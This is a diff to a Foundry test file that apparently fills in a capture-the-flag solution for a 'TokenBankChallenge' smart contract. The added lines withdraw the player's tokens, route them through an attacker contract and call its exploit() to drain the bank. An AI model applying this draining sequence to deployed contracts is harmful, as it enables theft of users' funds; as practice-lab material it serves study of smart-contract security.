@@ -15,7 +15,19 @@ contract TankBankTest is Test {
         tokenBankChallenge = new TokenBankChallenge(player);
         tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));
 
-        // Put your solution here
+        // player transfers tokens to attacker
+        vm.startPrank(player);
+        uint amount = tokenBankChallenge.balanceOf(player);
+        tokenBankChallenge.withdraw(amount);
+        SimpleERC223Token token = tokenBankChallenge.token();
+        // Attacker deposits tokens and calls exploit, which withdraws tokens until bank is drained.
+        token.transfer(address(tokenBankAttacker), amount);
+        vm.stopPrank();
+
+        vm.startPrank(address(tokenBankAttacker));
+        token.transfer(address(tokenBankChallenge), amount);
+        tokenBankAttacker.exploit();
+        vm.stopPrank();
 
         _checkSolved();
     }
